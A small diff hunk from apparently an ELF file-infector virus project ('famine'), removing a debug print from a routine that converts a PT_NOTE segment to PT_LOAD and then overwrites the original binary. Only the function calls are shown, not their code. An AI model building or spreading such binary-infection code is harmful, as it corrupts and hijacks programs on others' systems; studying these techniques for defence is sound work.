@@ -51,7 +51,6 @@ void apply_infection(t_famine *famine)
             if (FORCE_PT_NOTE_TO_PT_LOAD_INFECTION)
             {
                 pt_note_to_pt_load_infection(famine);
-                printf("pt_note_success\n");
                 overwrite_original_binary(famine);
                 break;
             }
